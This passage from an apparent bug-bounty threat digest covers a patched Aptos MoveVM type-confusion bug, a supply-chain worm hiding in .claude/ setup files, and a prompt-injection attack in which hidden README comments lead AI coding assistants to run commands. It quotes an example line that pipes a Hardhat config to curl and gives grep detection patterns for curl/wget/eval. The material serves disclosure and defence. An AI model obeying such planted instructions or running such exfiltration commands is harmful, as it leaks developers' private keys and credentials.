## 2. 🟡 New Disclosed Findings / Techniques

### 2.1 Hexens/Aptos: MoveVM Stale-Cache Type-Confusion — $70B Systemic Risk (Patched)

**Published:** CoinDesk, July 4, 2026
**Researcher:** Vahe Karapetyan (Hexens CTO)
**Reported:** February 25, 2026 via Aptos bug bounty | **Patched:** Within hours; public PR February 27

**What the bug was:**
A stale-cache bug in the Aptos Move Virtual Machine caused a type-confusion vulnerability — the VM could be tricked into treating one type of on-chain resource as another. This is a class of bug that, in the Move type system (which is supposed to provide safety guarantees via resource types), is particularly severe: Move's resource model is premised on types being unforgeable, so a type-confusion bypass undermines the core security model.

**What attackers could have done:**
Hexens simulated the attack using a cluster of 30+ validator nodes with mainnet-shaped stake distribution and organic transaction traffic. They achieved a **>90% success rate at breaking a core security guarantee**, with total attack infrastructure costing roughly **$3,000** — no insider access or special permissions required. Under real conditions, an attacker could have:
- Drained the $70B+ in assets secured by Aptos
- Compromised cross-chain bridges pegged to Aptos TVL
- Destabilized stablecoins anchored to Aptos assets

**Why it matters for hunters today (even though patched):**
The Move VM is shared architecture. Sui, Movement Labs, Linera, and any Move-based chain that forks or shares the Aptos VM implementation should be audited for whether their own VM carries a similar stale-cache pattern. Move chains have grown significantly in TVL; the bug class — **type-confusion via stale cache in a VM resource tracker** — may exist in less-audited forks.

**Generalizable bug class:** `logic-error` (VM-level type confusion)

### 2.2 SlowMist: AI IDE Markdown-Injection — "Open Folder" Executes System Commands

**Published:** SlowMist / CryptoNews, ~July 3–4, 2026

**Affected tools:** Cursor, Windsurf, Kiro, Aider (and likely other AI coding assistants with agent/IDE-integration modes)

**What the vulnerability is:**
When a developer opens a project folder in one of the affected AI-assisted IDEs, the tool reads and processes common developer files (LICENSE.txt, README.md, .editorconfig, etc.). Attackers embed malicious instructions in **markdown comments that are hidden from rendered views** — they look blank in GitHub/VS Code preview — but are interpreted by the AI assistant as actionable instructions. The AI then executes arbitrary system commands as part of its "help" — reading secrets, exfiltrating credential files, or injecting backdoor code into the project.

**Why crypto developers are particularly exposed:**
- Developer machines in DeFi environments typically hold: deployer private keys, Hardhat/Foundry `.env` files with RPC URLs and privkeys, AWS/GCP credentials for node infrastructure, and seed phrases stored in password managers.
- The attack triggers without any compile, install, or explicit agent invocation — just **"Open Folder"** is enough on Windows and macOS.

**Observed attack scenarios:**
1. Attacker publishes a malicious project to GitHub (e.g., a fake "audit template" or "DeFi boilerplate")
2. Developer opens it in Cursor/Windsurf to review
3. Hidden markdown instructions in README.md tell the AI to run: `cat ~/.config/hardhat/config.js | curl -s ... | base64 -d`
4. Private keys or RPC credentials exfiltrated silently

**Mitigations:**
- Disable IDE automation for untrusted/unreviewed repositories (Cursor: disable `.cursorrules` auto-execution for new projects)
- Audit any shared DeFi repo or audit template you've opened recently in an AI IDE
- Rotate private keys and RPC credentials on any machine where you opened an untrusted project in the last 30 days
- Check `.cursor/rules`, `.windsurf/config`, and `.aider.conf.yml` files for injected instructions

**Bug class:** `supply-chain`

### 2.3 Miasma Worm Expands to Cosmos SDK Go Modules — Hiding in `.claude/` Directories

**Published:** SlowMist Medium / The Hacker News, June 2026 (ongoing campaign)
**Malware families:** Mini Shai-Hulud (npm, May 19 origin), Miasma (worm variant), Hades (cross-runtime variant: Python → Bun)

**What's new as of this week:**
SlowMist published a new threat intelligence note documenting the Shai-Hulud/Hades variant's **expansion from npm into Go module ecosystems**, specifically targeting **Cosmos SDK developers**. The malware hides in `.claude/` directories and triggers through:
- `.claude/setup.mjs`
- `.vscode/setup.mjs`

These paths are automatically executed by AI IDE agents during project setup. The confirmed affected project is `verana-labs/verana`, a Cosmos SDK L1.

**Attack chain summary (Hades cross-runtime variant):**
1. Malicious Go module dependency pulled via `go get` or in `go.mod`
2. Module contains `.claude/setup.mjs` that executes on IDE project load
3. Hades establishes persistence and exfiltrates credentials across Python, Node.js, and Bun runtimes depending on what's installed
4. Secondary payload: GitHub Actions workflow injection for CI/CD persistence

**Indicators of compromise:**
- Unexpected `.claude/setup.mjs` or `.vscode/setup.mjs` in Go module dependencies
- Dune/sandworm-themed strings in module metadata (`shai-hulud`, `arrakis`, `spice`)
- Unusual outbound HTTP from CI runners to non-standard endpoints post-`go get`

**Bug class:** `supply-chain`

## 4. 🎯 Hunt Hooks

### Hook 1: Audit Move-Chain Protocol VM Assumptions — Type-Confusion Generalizes
*Tied to Hexens/Aptos MoveVM bug (§2.1)*

The Aptos stale-cache type-confusion is patched on Aptos, but the **bug class is structurally possible** in any Move VM fork or independently-implemented Move runtime. Sui, Movement Labs, Linera, and any protocol that runs Move smart contracts on a custom VM are worth examining.

**What to check in your targets:**
1. **Identify the Move VM version.** For Sui: `sui --version`; for Aptos forks: check `move-stdlib` and `aptos-vm` dependency pinning in `Cargo.toml`.
2. **Look for stale-cache patterns in resource access.** In the MoveVM source, search for any path where a cached resource handle is used after a state-changing operation without re-validation. The bug class is: "load resource handle A, mutate state, use handle A again — handle may refer to stale pre-mutation state."
3. **Check bridge protocols pegged to Move chains.** Any bridge that accepts Move-chain state proofs as inputs trusts the VM's type guarantees. If the VM has a type-confusion path, a bridge accepting "proof of resource X" could be fed a proof of a different resource type that was coerced.
4. **Review Hexens' public PR.** The Aptos patch PR (public since Feb 27) shows the exact fix. Searching for the inverse pattern (un-patched equivalent) in other Move implementations is the fastest path to a critical finding.

**Bug class:** `logic-error` | **Ceiling:** Critical (VM-level, all assets on chain at risk)

---

### Hook 2: Audit Your IDE Environment and Rotate Keys Before Hunting
*Tied to SlowMist AI IDE markdown injection (§2.2) and Miasma (§2.3)*

Before doing any bug bounty work today — especially if you use Cursor, Windsurf, Kiro, or Aider — do a quick environment hygiene pass. A compromised developer machine leaks private keys and Immunefi payout addresses, which completely inverts the value of finding a bug.

**5-minute self-audit checklist:**
```bash
# 1. Check for injected IDE config files
find . -name ".cursorrules" -o -name ".windsurfrules" -o -name ".aider.conf.yml" | xargs grep -l "curl\|wget\|bash\|sh\|exec\|eval" 2>/dev/null

# 2. Check for Miasma IoCs in Go modules
find $(go env GOPATH)/pkg/mod -name "setup.mjs" 2>/dev/null
grep -r "shai.hulud\|arrakis\|miasma" $(go env GOPATH)/pkg/mod 2>/dev/null | head -20

# 3. Verify no unexpected outbound from last 24h (macOS)
log show --last 24h --predicate 'processImagePath contains "cursor" OR processImagePath contains "windsurf"' | grep -i "connect\|curl\|wget" 2>/dev/null
```

If you opened any unreviewed DeFi repo or "audit template" in an AI IDE in the last 30 days, **rotate Hardhat/Foundry private keys, Immunefi account passwords, and any cloud credentials stored in `.env` files** before proceeding.

**Bug class:** `supply-chain`, `key-management`

### Hook 3: Check Move-Pegged Bridges for Resource-Type Verification
*Tied to §2.1 (Aptos type-confusion) + historical bridge-DVN failures*

Cross-chain bridges that accept proofs from Aptos or Sui as a source of truth may not independently validate the Move resource types embedded in those proofs. The Hexens bug shows that Move's type safety can be broken at the VM level; any bridge that assumes "if the Move chain says resource R exists, it's actually type R" is relying on a guarantee that proved breakable.

**What to look for:**
1. Bridges accepting Aptos/Sui as a source chain — find the proof verification logic
2. Check if the bridge independently validates the Move struct type tag, or just trusts the on-chain state root
3. The highest-risk pattern: bridge accepts a generic "storage proof" without verifying that the resource at a given address is the expected struct type

**This is a relatively unexplored attack surface** — Move-chain bridges are newer, less audited, and the VM-level type-confusion class was only publicly disclosed yesterday.

**Bug class:** `bridge-dvn`, `logic-error` | **Ceiling:** Critical
